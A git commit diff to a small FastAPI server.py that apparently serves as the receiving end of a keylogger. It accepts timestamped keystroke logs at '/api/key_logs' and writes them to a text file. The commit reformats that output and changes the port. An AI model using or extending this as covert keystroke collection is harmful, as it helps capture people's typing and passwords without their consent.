8a5999f60ba42182ac07640cc8eb4730192db156
Yehuda Freiman <yehfre@icloud.com>
2025-09-01 08:19:24 +0300

    Update server.py

--- server.py
+++ server.py
@@ -1,15 +1,16 @@
 from fastapi import FastAPI
-import json
-import uvicorn
 
 app = FastAPI()
 
 @app.post("/api/key_logs")
 async def receive_key_logs(logs: list):
     with open("server_key_logs.txt", "a") as f:
-        json.dump(logs, f, indent=2)
-        f.write("\n")
+        for log_dict in logs:
+            for timestamp in log_dict:
+                for key in log_dict[timestamp]:
+                    f.write(f"{timestamp}\n{key}\n")
     return {"message": "Data received"}
 
 if __name__ == '__main__':
-    uvicorn.run(app, host="0.0.0.0", port=8000)
+    import uvicorn
+    uvicorn.run(app, host="0.0.0.0", port=8001)
